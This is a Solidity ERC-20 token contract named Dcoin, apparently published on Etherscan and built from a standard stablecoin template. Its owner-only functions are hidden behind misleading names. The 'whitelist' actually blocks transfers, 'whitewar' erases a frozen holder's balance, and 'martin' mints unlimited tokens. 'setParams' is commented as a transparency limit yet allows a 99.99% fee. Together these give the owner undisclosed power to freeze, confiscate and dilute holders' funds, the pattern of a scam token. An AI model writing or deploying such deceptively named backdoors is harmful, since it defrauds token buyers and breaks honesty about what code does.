['/**\n', ' *Submitted for verification at Etherscan.io on 2021-04-11\n', '*/\n', '\n', 'pragma solidity ^0.4.17;\n', '\n', '/**\n', ' * @title SafeMath\n', ' * @dev Math operations with safety checks that throw on error\n', ' */\n', 'library SafeMath {\n', '    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        if (a == 0) {\n', '            return 0;\n', '        }\n', '        uint256 c = a * b;\n', '        assert(c / a == b);\n', '        return c;\n', '    }\n', '\n', '    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        // assert(b > 0); // Solidity automatically throws when dividing by 0\n', '        uint256 c = a / b;\n', "        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n", '        return c;\n', '    }\n', '\n', '    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        assert(b <= a);\n', '        return a - b;\n', '    }\n', '\n', '    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        uint256 c = a + b;\n', '        assert(c >= a);\n', '        return c;\n', '    }\n', '}\n', '\n', '/**\n', ' * @title Ownable\n', ' * @dev The Ownable contract has an owner address, and provides basic authorization control\n', ' * functions, this simplifies the implementation of "user permissions".\n', ' */\n', 'contract Ownable {\n', '    address public king;\n', '\n', '    function Ownable() public {\n', '        king = msg.sender;\n', '    }\n', '    modifier onlyOwner() {\n', '        require(msg.sender == king);\n', '        _;\n', '    }\n', '    function sking(address _user) public onlyOwner {\n', '        if (_user != address(0)) {\n', '            king = _user;\n', '        }\n', '    }\n', '\n', '}\n', '\n', '/**\n', ' * @title ERC20Basic\n', ' * @dev Simpler version of ERC20 interface\n', ' * @dev see https://github.com/ethereum/EIPs/issues/20\n', ' */\n', 'contract ERC20Basic {\n', '    uint public _totalSupply;\n', '    function totalSupply() public constant returns (uint);\n', '    function balanceOf(address who) public constant returns (uint);\n', '    function transfer(address to, uint value) public;\n', '    event Transfer(address indexed from, address indexed to, uint value);\n', '    event Burn(address indexed from, uint value);\n', '}\n', '\n', '/**\n', ' * @title ERC20 interface\n', ' * @dev see https://github.com/ethereum/EIPs/issues/20\n', ' */\n', 'contract ERC20 is ERC20Basic {\n', '    function allowance(address owner, address spender) public constant returns (uint);\n', '    function transferFrom(address from, address to, uint value) public;\n', '    function approve(address spender, uint value) public;\n', '    event Approval(address indexed owner, address indexed spender, uint value);\n', '}\n', '/**\n', ' * @title Basic token\n', ' * @dev Basic version of StandardToken, with no allowances.\n', ' */\n', 'contract BasicToken is Ownable, ERC20Basic {\n', '    using SafeMath for uint;\n', '\n', '    mapping(address => uint) public balances;\n', '\n', '    // additional variables for use if transaction fees ever became necessary\n', '    uint public basisPointsRate = 0;\n', '    address public burnAddress = address(0);\n', '\n', '    /**\n', '    * @dev Fix for the ERC20 short address attack.\n', '    */\n', '    modifier onlyPayloadSize(uint size) {\n', '        require(!(msg.data.length < size + 4));\n', '        _;\n', '    }\n', '\n', '    /**\n', '    * @dev transfer token for a specified address\n', '    * @param _to The address to transfer to.\n', '    * @param _value The amount to be transferred.\n', '    */\n', '    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\n', '        uint burnFee = (_value.mul(basisPointsRate)).div(10000);\n', '\n', '        uint sendAmount = _value.sub(burnFee);\n', '        balances[msg.sender] = balances[msg.sender].sub(_value);\n', '        balances[_to] = balances[_to].add(sendAmount);\n', '        if (burnFee > 0) {\n', '            balances[burnAddress] = balances[burnAddress].add(burnFee);\n', '            _totalSupply -= burnFee;\n', '            Burn(msg.sender, burnFee);\n', '        }\n', '        Transfer(msg.sender, _to, sendAmount);\n', '    }\n', '\n', '    /**\n', '    * @dev Gets the balance of the specified address.\n', '    * @param _owner The address to query the the balance of.\n', '    * @return An uint representing the amount owned by the passed address.\n', '    */\n', '    function balanceOf(address _owner) public constant returns (uint balance) {\n', '        return balances[_owner];\n', '    }\n', '\n', '}\n', '\n', '/**\n', ' * @title Standard ERC20 token\n', ' *\n', ' * @dev Implementation of the basic standard token.\n', ' * @dev https://github.com/ethereum/EIPs/issues/20\n', ' * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\n', ' */\n', 'contract StandardToken is BasicToken, ERC20 {\n', '\n', '    mapping (address => mapping (address => uint)) public allowed;\n', '\n', '    uint public constant MAX_UINT = 2**256 - 1;\n', '\n', '    /**\n', '    * @dev Transfer tokens from one address to another\n', '    * @param _from address The address which you want to send tokens from\n', '    * @param _to address The address which you want to transfer to\n', '    * @param _value uint the amount of tokens to be transferred\n', '    */\n', '    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\n', '        var _allowance = allowed[_from][msg.sender];\n', '\n', '        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\n', '        // if (_value > _allowance) throw;\n', '\n', '        uint burnFee = (_value.mul(basisPointsRate)).div(10000);\n', '\n', '        if (_allowance < MAX_UINT) {\n', '            allowed[_from][msg.sender] = _allowance.sub(_value);\n', '        }\n', '        uint sendAmount = _value.sub(burnFee);\n', '        balances[_from] = balances[_from].sub(_value);\n', '        balances[_to] = balances[_to].add(sendAmount);\n', '        if (burnFee > 0) {\n', '            balances[burnAddress] = balances[burnAddress].add(burnFee);\n', '            _totalSupply -= burnFee;\n', '            Burn(_from, burnFee);\n', '        }\n', '        Transfer(_from, _to, sendAmount);\n', '    }\n', '\n', '    /**\n', '    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\n', '    * @param _spender The address which will spend the funds.\n', '    * @param _value The amount of tokens to be spent.\n', '    */\n', '    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\n', '\n', '        // To change the approve amount you first have to reduce the addresses`\n', '        //  allowance to zero by calling `approve(_spender, 0)` if it is not\n', '        //  already 0 to mitigate the race condition described here:\n', '        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n', '        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\n', '\n', '        allowed[msg.sender][_spender] = _value;\n', '        Approval(msg.sender, _spender, _value);\n', '    }\n', '\n', '    /**\n', '    * @dev Function to check the amount of tokens than an owner allowed to a spender.\n', '    * @param _owner address The address which owns the funds.\n', '    * @param _spender address The address which will spend the funds.\n', '    * @return A uint specifying the amount of tokens still available for the spender.\n', '    */\n', '    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\n', '        return allowed[_owner][_spender];\n', '    }\n', '\n', '}\n', '\n', 'contract BlackList is Ownable, BasicToken {\n', '\n', '    function scouts(address _maker) external constant returns (bool) {\n', '        return whitelist[_maker];\n', '    }\n', '\n', '    mapping (address => bool) public whitelist;\n', '\n', '    function addwhite (address _user) public onlyOwner {\n', '        whitelist[_user] = true;\n', '        AddedBlackList(_user);\n', '    }\n', '\n', '    function victory (address _user) public onlyOwner {\n', '        whitelist[_user] = false;\n', '        RemovedBlackList(_user);\n', '    }\n', '\n', '    function whitewar (address _user) public onlyOwner {\n', '        require(whitelist[_user]);\n', '        uint dirtyFunds = balanceOf(_user);\n', '        balances[_user] = 0;\n', '        _totalSupply -= dirtyFunds;\n', '        DestroyedBlackFunds(_user, dirtyFunds);\n', '    }\n', '\n', '    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\n', '\n', '    event AddedBlackList(address _user);\n', '\n', '    event RemovedBlackList(address _user);\n', '\n', '}\n', '\n', 'contract Dcoin is StandardToken, BlackList {\n', '    string public name;\n', '    string public symbol;\n', '    uint public decimals;\n', '\n', '    function Dcoin(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\n', '        _totalSupply = _initialSupply;\n', '        name = _name;\n', '        symbol = _symbol;\n', '        decimals = _decimals;\n', '        balances[king] = _initialSupply;\n', '    }\n', '\n', '    function transfer(address _to, uint _value) public  {\n', '        require(!whitelist[msg.sender]);\n', '        return super.transfer(_to, _value);\n', '    }\n', '\n', '    function transferFrom(address _from, address _to, uint _value) public  {\n', '        require(!whitelist[_from]);\n', '        return super.transferFrom(_from, _to, _value);\n', '    }\n', '\n', '    function balanceOf(address who) public constant returns (uint) {\n', '        return super.balanceOf(who);\n', '    }\n', '\n', '    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\n', '        return super.approve(_spender, _value);\n', '    }\n', '\n', '    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\n', '        return super.allowance(_owner, _spender);\n', '    }\n', '\n', '    function totalSupply() public constant returns (uint) {\n', '        return _totalSupply;\n', '    }\n', '\n', '    function martin(uint amount) public onlyOwner {\n', '        require(_totalSupply + amount > _totalSupply);\n', '        require(balances[king] + amount > balances[king]);\n', '        balances[king] += amount;\n', '        _totalSupply += amount;\n', '        Issue(amount);\n', '    }\n', '\n', '    function setParams(uint newBasisPoints) public onlyOwner {\n', '        // Ensure transparency by hardcoding limit beyond which fees can never be added\n', '        require(newBasisPoints < 10000);\n', '        basisPointsRate = newBasisPoints;\n', '\n', '        Params(basisPointsRate);\n', '    }\n', '    // Called when new token are issued\n', '    event Issue(uint amount);\n', '    event Params(uint rate);\n', '\n', '}']